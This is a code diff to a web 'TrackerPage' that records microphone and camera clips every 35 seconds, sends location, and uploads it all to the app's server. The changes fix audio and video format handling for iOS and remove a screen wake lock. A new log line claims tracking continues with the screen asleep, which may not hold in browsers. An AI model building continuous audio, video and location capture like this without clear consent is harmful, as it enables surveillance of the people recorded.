@@ -154,8 +154,16 @@ export default function TrackerPage() {
       setIsRecording(true);
       addLog("🎙️ Microphone access granted");
 
+      // Detect best supported audio MIME type (iOS Safari needs audio/mp4)
+      const audioMime =
+        MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus" :
+        MediaRecorder.isTypeSupported("audio/webm") ? "audio/webm" :
+        MediaRecorder.isTypeSupported("audio/mp4") ? "audio/mp4" :
+        "";
+
       const recordChunk = () => {
-        const recorder = new MediaRecorder(stream, { mimeType: "audio/webm" });
+        const recorderOpts = audioMime ? { mimeType: audioMime } : {};
+        const recorder = new MediaRecorder(stream, recorderOpts);
         audioChunksRef.current = [];
 
         recorder.ondataavailable = (e) => {
@@ -163,11 +171,12 @@ export default function TrackerPage() {
         };
 
         recorder.onstop = async () => {
-          const blob = new Blob(audioChunksRef.current, { type: "audio/webm" });
+          const blob = new Blob(audioChunksRef.current, { type: audioMime || "audio/webm" });
           if (blob.size < 500) return; // skip near-empty clips
 
           const formData = new FormData();
-          formData.append("audio", blob, "clip.webm");
+          const ext = audioMime.includes("mp4") ? "mp4" : "webm";
+          formData.append("audio", blob, `clip.${ext}`);
 
           try {
             await fetch("/api/audio", { method: "POST", body: formData });
@@ -189,8 +198,8 @@ export default function TrackerPage() {
       recordChunk();
       // Repeat every 35 seconds (5s buffer between clips)
       recordingIntervalRef.current = setInterval(recordChunk, 35_000);
-    } catch {
-      addLog("⚠️ Microphone permission denied");
+    } catch (err) {
+      addLog(`⚠️ Microphone error: ${err instanceof Error ? err.message : "permission denied"}`);
     }
   }, [addLog]);
 
@@ -212,11 +221,16 @@ export default function TrackerPage() {
       setIsCameraRecording(true);
       addLog("📷 Camera access granted");
 
+      // Detect best supported video MIME type (iOS Safari needs video/mp4)
+      const videoMime =
+        MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" :
+        MediaRecorder.isTypeSupported("video/webm") ? "video/webm" :
+        MediaRecorder.isTypeSupported("video/mp4") ? "video/mp4" :
+        "";
+
       const recordChunk = () => {
-        const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
-          ? "video/webm;codecs=vp9"
-          : "video/webm";
-        const recorder = new MediaRecorder(stream, { mimeType });
+        const recorderOpts = videoMime ? { mimeType: videoMime } : {};
+        const recorder = new MediaRecorder(stream, recorderOpts);
         const chunks: Blob[] = [];
 
         recorder.ondataavailable = (e) => {
@@ -224,10 +238,11 @@ export default function TrackerPage() {
         };
 
         recorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: mimeType });
+          const blob = new Blob(chunks, { type: videoMime || "video/webm" });
           if (blob.size < 1000) return;
           const formData = new FormData();
-          formData.append("video", blob, "clip.webm");
+          const ext = videoMime.includes("mp4") ? "mp4" : "webm";
+          formData.append("video", blob, `clip.${ext}`);
           try {
             await fetch("/api/video", { method: "POST", body: formData });
             addLog("🎥 Video clip uploaded");
@@ -245,8 +260,8 @@ export default function TrackerPage() {
 
       recordChunk();
       cameraIntervalRef.current = setInterval(recordChunk, 35_000);
-    } catch {
-      addLog("ℹ️ Camera not available or permission denied");
+    } catch (err) {
+      addLog(`ℹ️ Camera error: ${err instanceof Error ? err.message : "not available"}`);
     }
   }, [addLog]);
 
@@ -301,15 +316,7 @@ export default function TrackerPage() {
     // Start camera recording
     await startCameraRecordingCycle();
 
-    // Keep screen awake via Wake Lock API if available
-    if ("wakeLock" in navigator) {
-      try {
-        await (navigator as { wakeLock: { request: (t: string) => Promise<unknown> } }).wakeLock.request("screen");
-        addLog("🔒 Screen wake lock acquired");
-      } catch {
-        addLog("ℹ️ Wake lock not available");
-      }
-    }
+    addLog("📱 Screen can sleep — tracking continues in background");
   }, [addLog, sendLocation, startRecordingCycle, startCameraRecordingCycle]);
 
   const deactivate = useCallback(async () => {
